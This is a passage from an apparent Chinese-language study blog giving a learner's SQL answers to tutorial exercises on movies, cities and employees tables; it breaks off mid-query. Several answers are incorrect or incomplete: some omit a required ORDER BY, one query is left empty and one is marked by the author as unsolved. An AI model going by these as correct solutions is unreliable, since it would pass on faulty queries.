title="lesson 2 condition"></a>lesson 2 condition</h2><ol><li><p>找到<code>id</code>为6的电影</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> movies</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">id</span> = <span class="number">6</span>;</span><br></pre></td></tr></table></figure></li><li><p>找到在2000-2010年间<code>year</code>上映的电影</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> movies</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">year</span> <span class="keyword">between</span> <span class="number">2000</span> <span class="keyword">and</span> <span class="number">2010</span>;</span><br></pre></td></tr></table></figure></li><li><p>找到不是在2000-2010年间<code>year</code>上映的电影</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> movies</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">year</span> <span class="keyword">not</span> <span class="keyword">between</span> <span class="number">2000</span> <span class="keyword">and</span> <span class="number">2010</span>;</span><br></pre></td></tr></table></figure></li><li><p>找到头5部电影</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> movies</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">id</span>&lt;<span class="number">6</span>;</span><br></pre></td></tr></table></figure></li><li><p>找到2010（含）年之后的电影里片长小于两个小时的片子</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> movies</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">year</span> &gt;=<span class="number">2010</span></span><br><span class="line">    <span class="keyword">and</span> length_minutes&lt;<span class="number">120</span>;</span><br></pre></td></tr></table></figure></li><li><p>找到99年和09年的电影,只要列出年份和片长看下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">year</span>,length_minutes <span class="keyword">FROM</span> movies</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">year</span>=<span class="number">1999</span> <span class="keyword">or</span> <span class="keyword">year</span>=<span class="number">2009</span>;</span><br></pre></td></tr></table></figure></li></ol><h2 id="lesson-3-condition"><a href="#lesson-3-condition" class="headerlink" title="lesson 3 condition"></a>lesson 3 condition</h2><ol><li><p>找到所有<code>Toy Story</code>系列电影 </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> movies</span><br><span class="line"><span class="keyword">where</span> title <span class="keyword">like</span> <span class="string">'toy story%'</span></span><br></pre></td></tr></table></figure></li><li><p>找到所有<code>John Lasseter</code>导演的电影</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> movies</span><br><span class="line"><span class="keyword">where</span> director <span class="keyword">like</span> <span class="string">'john lasseter'</span></span><br></pre></td></tr></table></figure></li><li><p>找到所有不是<code>John Lasseter</code>导演的电影</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> movies</span><br><span class="line"><span class="keyword">where</span> director <span class="keyword">not</span> <span class="keyword">like</span> <span class="string">'john lasseter'</span></span><br></pre></td></tr></table></figure></li><li><p>找到所有电影名为<code>&quot;WALL-&quot;</code>开头的电影</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> movies</span><br><span class="line"><span class="keyword">where</span> title <span class="keyword">like</span> <span class="string">'wall-%'</span></span><br></pre></td></tr></table></figure></li><li><p>有一部98年电影中文名《虫虫危机》请给我找出来</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> movies</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">year</span> = <span class="number">1998</span></span><br></pre></td></tr></table></figure></li><li><p>找出所有Pete导演的电影,只要列出电影名,导演名和年份就可以</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> title,director,<span class="keyword">year</span> <span class="keyword">FROM</span> movies</span><br><span class="line"><span class="keyword">where</span> director <span class="keyword">like</span> <span class="string">'pete%'</span></span><br></pre></td></tr></table></figure></li><li><p>John Lasseter导演了两个系列，一个Car系列一个Toy Story系列,请帮我列出这John Lasseter导演两个系列千禧年之后的电影</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> movies</span><br><span class="line"><span class="keyword">where</span> director <span class="keyword">like</span> <span class="string">'john lasseter'</span></span><br><span class="line">    <span class="keyword">and</span> <span class="keyword">year</span>&gt;<span class="number">2000</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="lesson-4-filtering-and-sorting"><a href="#lesson-4-filtering-and-sorting" class="headerlink" title="lesson 4 filtering and sorting"></a>lesson 4 filtering and sorting</h2><ol><li><p>按导演名<code>排重</code>列出所有电影，并按导演名正序排列</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">distinct</span> director <span class="keyword">FROM</span> movies</span><br></pre></td></tr></table></figure></li><li><p>列出按上映年份<code>最新</code>上线的4部电影</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> movies</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> <span class="keyword">year</span> <span class="keyword">desc</span></span><br><span class="line"><span class="keyword">limit</span> <span class="number">4</span></span><br></pre></td></tr></table></figure></li><li><p>按电影名字母序<code>升序</code>排列，列出前5部电影</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> movies</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> title <span class="keyword">asc</span></span><br><span class="line"><span class="keyword">limit</span> <span class="number">5</span></span><br></pre></td></tr></table></figure></li><li><p>按电影名字母序升序排列，列出上一题<code>之后</code>的5部电影</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> movies</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> title <span class="keyword">asc</span></span><br><span class="line"><span class="keyword">limit</span> <span class="number">5</span> <span class="keyword">offset</span> <span class="number">5</span></span><br></pre></td></tr></table></figure></li><li><p>如果按片长排列，John Lasseter导演导过片长第3长的电影是哪部，列出名字即可</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> title <span class="keyword">FROM</span> movies</span><br><span class="line"><span class="keyword">where</span> director <span class="keyword">like</span> <span class="string">'john lasseter'</span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> length_minutes <span class="keyword">asc</span></span><br><span class="line"><span class="keyword">limit</span> <span class="number">1</span> <span class="keyword">offset</span> <span class="number">2</span></span><br></pre></td></tr></table></figure></li><li><p>按导演名字母升序,如果导演名相同按年份降序,取前10部电影给我</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> movies</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> director <span class="keyword">asc</span>,<span class="keyword">year</span> <span class="keyword">desc</span></span><br><span class="line"><span class="keyword">limit</span> <span class="number">10</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="lesson-5-review"><a href="#lesson-5-review" class="headerlink" title="lesson 5 review"></a>lesson 5 review</h2><ol><li><p>列出所有加拿大人的<code>Canadian</code>信息(包括所有字段)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> north_american_cities</span><br><span class="line"><span class="keyword">where</span> country <span class="keyword">like</span> <span class="string">'canada'</span></span><br></pre></td></tr></table></figure></li><li><p>列出所有美国<code>United States</code>的城市按纬度从北到南排序(包括所有字段)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> north_american_cities</span><br><span class="line"><span class="keyword">where</span> country <span class="keyword">like</span> <span class="string">'united states'</span></span><br></pre></td></tr></table></figure></li><li><p>列出所有在<code>Chicago</code>西部的城市，从西到东排序(包括所有字段)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> north_american_cities</span><br><span class="line"><span class="keyword">where</span> Longitude &lt; <span class="number">-87.629798</span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> Longitude <span class="keyword">asc</span></span><br></pre></td></tr></table></figure></li><li><p>用人口数<code>population</code>排序,列出墨西哥<code>Mexico</code>最大的2个城市(包括所有字段)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> north_american_cities</span><br><span class="line"><span class="keyword">where</span> country <span class="keyword">like</span> <span class="string">'mexico'</span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> population <span class="keyword">desc</span></span><br><span class="line"><span class="keyword">limit</span> <span class="number">2</span></span><br></pre></td></tr></table></figure></li><li><p>列出美国<code>United States</code>人口3-4位的两个城市和他们的人口(包括所有字段)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> north_american_cities</span><br><span class="line"><span class="keyword">where</span> country <span class="keyword">like</span> <span class="string">'united states'</span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> population <span class="keyword">desc</span></span><br><span class="line"><span class="keyword">limit</span> <span class="number">2</span> <span class="keyword">offset</span> <span class="number">2</span></span><br></pre></td></tr></table></figure></li><li><p>北美所有城市,请按国家名字母序从A-Z再按人口从多到少排列看下前10位的城市(包括所有字段)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> north_american_cities</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> country <span class="keyword">asc</span> ,population <span class="keyword">desc</span></span><br><span class="line"><span class="keyword">limit</span> <span class="number">10</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="lesson-6-inner-join"><a href="#lesson-6-inner-join" class="headerlink" title="lesson 6 inner join"></a>lesson 6 inner join</h2><ol><li><p>找到所有电影的线下<code>Domestic_sales</code>和线上销售额</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> movies</span><br><span class="line"><span class="keyword">inner</span> <span class="keyword">join</span> Boxoffice </span><br><span class="line">    <span class="keyword">on</span> movies.id = boxoffice.movie_id</span><br></pre></td></tr></table></figure></li><li><p>找到所有线上销售额比线下销售大的电影</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> movies</span><br><span class="line"><span class="keyword">inner</span> <span class="keyword">join</span> Boxoffice </span><br><span class="line">    <span class="keyword">on</span> movies.id = boxoffice.movie_id</span><br><span class="line"><span class="keyword">where</span> International_sales&gt;Domestic_sales</span><br></pre></td></tr></table></figure></li><li><p>找出所有电影按市场占有率<code>rating</code>倒序排列</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> movies</span><br><span class="line"><span class="keyword">inner</span> <span class="keyword">join</span> Boxoffice </span><br><span class="line">    <span class="keyword">on</span> movies.id = boxoffice.movie_id</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> rating <span class="keyword">desc</span></span><br></pre></td></tr></table></figure></li><li><p>每部电影按线上销售额比较,排名最靠前的导演是谁,线上销量多少</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> director,International_sales <span class="keyword">FROM</span> movies</span><br><span class="line"><span class="keyword">inner</span> <span class="keyword">join</span> Boxoffice </span><br><span class="line">    <span class="keyword">on</span> movies.id = boxoffice.movie_id</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> International_sales <span class="keyword">desc</span></span><br><span class="line"><span class="keyword">limit</span> <span class="number">1</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="lesson-7-outer-join"><a href="#lesson-7-outer-join" class="headerlink" title="lesson 7 outer join"></a>lesson 7 outer join</h2><ol><li><p>找到所有有雇员的办公室(<code>buildings</code>)名字 </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">distinct</span> building </span><br><span class="line"><span class="keyword">FROM</span> employees</span><br><span class="line"><span class="keyword">left</span> <span class="keyword">join</span> buildings</span><br><span class="line">    <span class="keyword">on</span> employees.building = buildings.building_name</span><br></pre></td></tr></table></figure></li><li><p>找到所有办公室和他们的最大容量</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Building_name,<span class="keyword">capacity</span></span><br><span class="line"><span class="keyword">FROM</span>  Buildings</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> <span class="keyword">capacity</span> <span class="keyword">desc</span></span><br></pre></td></tr></table></figure></li><li><p>找到所有办公室里的所有角色（包含没有雇员的）,并做唯一输出(<code>DISTINCT</code>)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> building_name,<span class="keyword">role</span> </span><br><span class="line"><span class="keyword">from</span> Buildings  </span><br><span class="line"><span class="keyword">left</span> <span class="keyword">join</span> employees  </span><br><span class="line">    <span class="keyword">on</span> Buildings.building_name =employees.building;</span><br></pre></td></tr></table></figure></li><li><p>找到所有有雇员的办公室(<code>buildings</code>)和对应的容量</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> building,<span class="keyword">capacity</span> </span><br><span class="line"><span class="keyword">from</span> employees  </span><br><span class="line"><span class="keyword">left</span> <span class="keyword">join</span> buildings  </span><br><span class="line">    <span class="keyword">on</span> employees.building = buildings.building_name </span><br><span class="line"><span class="keyword">where</span> building <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">null</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="lesson-8-null"><a href="#lesson-8-null" class="headerlink" title="lesson 8 null"></a>lesson 8 null</h2><ol><li><p>找到雇员里还没有分配办公室的(列出名字和角色就可以)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">name</span>,<span class="keyword">role</span> <span class="keyword">FROM</span> employees</span><br><span class="line"><span class="keyword">where</span> building <span class="keyword">is</span> <span class="literal">null</span></span><br></pre></td></tr></table></figure></li><li><p>找到还没有雇员的办公室</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">distinct</span> building_name <span class="keyword">FROM</span> buildings</span><br><span class="line"><span class="keyword">left</span> <span class="keyword">join</span> employees</span><br><span class="line">    <span class="keyword">on</span> employees.building=buildings.building_name</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">name</span> <span class="keyword">is</span> <span class="literal">null</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="Lesson-9-表达式"><a href="#Lesson-9-表达式" class="headerlink" title="Lesson 9 表达式"></a>Lesson 9 表达式</h2><ol><li><p>列出所有的电影ID,名字和销售总额(以百万美元为单位计算)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">id</span>,title,(Domestic_sales+International_sales)/<span class="number">1000000</span> <span class="keyword">as</span> total <span class="keyword">FROM</span> movies <span class="keyword">as</span> mov</span><br><span class="line"><span class="keyword">inner</span> <span class="keyword">join</span> boxoffice <span class="keyword">as</span> box</span><br><span class="line">    <span class="keyword">on</span> mov.id = box.movie_id</span><br></pre></td></tr></table></figure></li><li><p>列出所有的电影ID,名字和市场指数(<code>Rating</code>的10倍为市场指数)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">id</span>,title,rating*<span class="number">10</span> <span class="keyword">as</span> point <span class="keyword">FROM</span> movies <span class="keyword">as</span> mov</span><br><span class="line"><span class="keyword">inner</span> <span class="keyword">join</span> boxoffice <span class="keyword">as</span> box</span><br><span class="line">    <span class="keyword">on</span> mov.id = box.movie_id</span><br></pre></td></tr></table></figure></li><li><p>列出所有偶数年份的电影，需要电影ID,名字和年份</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">id</span>,title,<span class="keyword">year</span> <span class="keyword">as</span> point <span class="keyword">FROM</span> movies <span class="keyword">as</span> mov</span><br><span class="line"><span class="keyword">inner</span> <span class="keyword">join</span> boxoffice <span class="keyword">as</span> box</span><br><span class="line">    <span class="keyword">on</span> mov.id = box.movie_id</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">year</span>%<span class="number">2</span>==<span class="number">0</span></span><br></pre></td></tr></table></figure></li><li><p>John Lasseter导演的每部电影每分钟值多少钱,告诉我最高的3个电影名和价值就可以</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> title,(Domestic_sales+International_sales)/length_minutes <span class="keyword">as</span> price_per_min <span class="keyword">FROM</span> movies <span class="keyword">as</span> mov</span><br><span class="line"><span class="keyword">inner</span> <span class="keyword">join</span> boxoffice <span class="keyword">as</span> box</span><br><span class="line">    <span class="keyword">on</span> mov.id = box.movie_id</span><br><span class="line"><span class="keyword">where</span> director <span class="keyword">like</span> <span class="string">'john lasseter'</span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> price_per_min <span class="keyword">desc</span></span><br><span class="line"><span class="keyword">limit</span> <span class="number">3</span></span><br></pre></td></tr></table></figure></li><li><p>电影名最长的3部电影和他们的总销量是多少</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> title,<span class="keyword">length</span>(title),Domestic_sales+International_sales <span class="keyword">as</span> total <span class="keyword">FROM</span> movies <span class="keyword">as</span> mov</span><br><span class="line"><span class="keyword">inner</span> <span class="keyword">join</span> boxoffice <span class="keyword">as</span> box</span><br><span class="line">    <span class="keyword">on</span> mov.id = box.movie_id</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> <span class="keyword">length</span>(title) <span class="keyword">desc</span></span><br><span class="line"><span class="keyword">limit</span> <span class="number">3</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="lesson-10-统计1"><a href="#lesson-10-统计1" class="headerlink" title="lesson 10 统计1"></a>lesson 10 统计1</h2><ol><li><p>找出就职年份最高的雇员(列出雇员名字+年份）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">name</span>,years_employed <span class="keyword">as</span> x <span class="keyword">FROM</span> employees</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> x <span class="keyword">desc</span></span><br><span class="line"><span class="keyword">limit</span> <span class="number">1</span></span><br></pre></td></tr></table></figure></li><li><p>按角色(<code>Role</code>)统计一下每个角色的平均就职年份</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">role</span>,<span class="keyword">avg</span>(years_employed) <span class="keyword">FROM</span> employees </span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">role</span></span><br></pre></td></tr></table></figure></li><li><p>按办公室名字总计一下就职年份总和</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">sum</span>(years_employed),building <span class="keyword">FROM</span> employees</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> building</span><br></pre></td></tr></table></figure></li><li><p>每栋办公室按人数排名,不要统计无办公室的雇员</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> building,<span class="keyword">count</span>() <span class="keyword">as</span> <span class="keyword">count</span> <span class="keyword">FROM</span> employees </span><br><span class="line"><span class="keyword">where</span> building <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">null</span> </span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> building</span><br></pre></td></tr></table></figure></li><li><p>就职1,3,5,7年的人分别占总人数的百分比率是多少(给出年份和比率”50%” 记为 50)</p><p>==这题没做出来: (,不知道错哪里==</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Years_employed,<span class="keyword">round</span>(<span class="keyword">count</span>(Years_employed)/<span class="number">15.0</span>*<span class="number">100</span>,<span class="number">0</span>)</span><br><span class="line">   <span class="keyword">FROM</span> employees</span><br><span class="line">   <span class="keyword">where</span> years_employed <span class="keyword">in</span> (<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>)</span><br><span class="line">   <span class="keyword">group</span> <span class="keyword">by</span> Years_employed</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">round(数值,小数点保留的位数)</span><br></pre></td></tr></table></figure></li></ol><h2 id="lesson-11-统计2"><a href="#lesson-11-统计2" class="headerlink" title="lesson 11 统计2"></a>lesson 11 统计2</h2><ol><li><p>统计一下Artist角色的雇员数量</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">count</span>(<span class="keyword">role</span>) <span class="keyword">FROM</span> employees</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">role</span></span><br><span class="line"><span class="keyword">having</span> <span class="keyword">role</span> <span class="keyword">like</span> <span class="string">'artist'</span></span><br></pre></td></tr></table></figure></li><li><p>按角色统计一下每个角色的雇员数量</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">role</span>,<span class="keyword">count</span>(<span class="keyword">role</span>) <span class="keyword">FROM</span> employees</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">role</span></span><br></pre></td></tr></table></figure></li><li><p>算出Engineer角色的就职年份总计</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">sum</span>(Years_employed) <span class="keyword">FROM</span> employees </span><br><span class="line"><span class="keyword">where</span> <span class="keyword">role</span> <span class="keyword">like</span> <span class="string">'engineer'</span></span><br></pre></td></tr></table></figure></li><li><p>按角色分组算出每个角色按有办公室和没办公室的统计人数(列出角色，数量，有无办公室,注意一个角色如果部分有办公室，部分没有需分开统计）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">role</span>,<span class="keyword">count</span>(building) <span class="keyword">as</span> <span class="built_in">number</span>,<span class="string">"yes"</span> <span class="keyword">FROM</span> employees a </span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">role</span> </span><br><span class="line"><span class="keyword">union</span> </span><br><span class="line"><span class="keyword">select</span> <span class="keyword">role</span>,<span class="keyword">count</span>(<span class="keyword">name</span>),<span class="string">"no"</span> <span class="keyword">from</span> employees b </span><br><span class="line"><span class="keyword">where</span> building <span class="keyword">is</span> <span class="literal">null</span> </span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">role</span></span><br></pre></td></tr></table></figure></li><li><p>按角色和就职年份统计人数,年份按0-3，3-6，6-9这种阶梯分组，最后按角色+阶梯分组排序</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> </span><br></pre></td></tr></table></figure></li></ol><h2 id="lesson-12"><a href="#lesson-12" class="headerlink" title="lesson 12"></a>lesson 12</h2><ol><li><p>统计出每一个导演的电影数量（列出导演名字和数量）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> director,<span class="keyword">count</span>(*) <span class="keyword">FROM</span> movies</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> director</span><br></pre></td></tr></table></figure></li><li><p>统计一下每个导演的销售总额(列出导演名字和销售总额)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> director,<span class="keyword">sum</span>(International_sales)+<span class="keyword">sum</span>(domestic_sales) <span class="keyword">FROM</span> movies</span><br><span class="line"><span class="keyword">inner</span> <span class="keyword">join</span> boxoffice</span><br><span class="line">    <span class="keyword">on</span> movies.id = boxoffice.movie_id</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> 